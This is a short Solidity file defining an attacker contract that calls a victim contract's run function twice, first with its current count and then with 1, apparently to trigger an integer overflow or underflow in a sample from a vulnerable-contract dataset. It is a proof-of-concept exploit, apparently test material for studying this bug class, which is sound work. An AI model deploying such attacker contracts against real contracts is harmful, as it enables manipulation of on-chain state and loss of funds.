pragma solidity ^0.8.0;

import "../dataset/arithmetic/integer_overflow_minimal.sol";

contract IntegerOverflowMinimalAttacker {
    IntegerOverflowMinimal victimContract;

    constructor (address _victimAddress) {
        victimContract = IntegerOverflowMinimal(_victimAddress);
    }

    function attack() public {
        uint256 count = victimContract.count();
        
        victimContract.run(count);
        victimContract.run(1);
    }
}